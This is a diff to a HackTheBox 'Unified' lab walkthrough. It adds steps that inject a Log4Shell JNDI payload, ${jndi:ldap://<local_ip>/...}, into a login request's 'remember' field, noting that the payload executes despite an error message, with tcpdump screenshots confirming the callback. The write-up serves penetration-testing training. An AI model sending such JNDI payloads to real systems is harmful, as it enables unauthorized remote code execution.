@@ -106,6 +106,9 @@ You can see the msg：<code>api.err.Invalid</code> in the response on the right.
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/repeaterinvalid.png" alt="repeaterinvalid" width="60%"><br> 
 Change the payload of <code>password</code> to <code>${jndi:ldap://&lt;local_ip&gt;/&lt;random_input&gt;}</code> and send it,<br> in the place of response on the right, you will also see msg: <code>api.err.Invalid</code>.<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/repeaterinvalid2.png" alt="repeaterinvalid2" width="60%">
+Replace the payload of <code>remember</code> with <code>${jndi:ldap://&lt;local_ip&gt;/&lt;random_input&gt;}</code> and send it,<br>
+in the response on the right, you will see msg：<code>api.err.Invalid<b>Payload</b></code>.<br>
+Despite an invalid message is displayed, in fact, the payload is still being executed behind the scenes.<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/Repeater2.png" alt="Repeater2" width="60%">
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/tcpdump.png" alt="tcpdump" width="60%">
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/tcpdump2.png" alt="tcpdump2" width="60%">
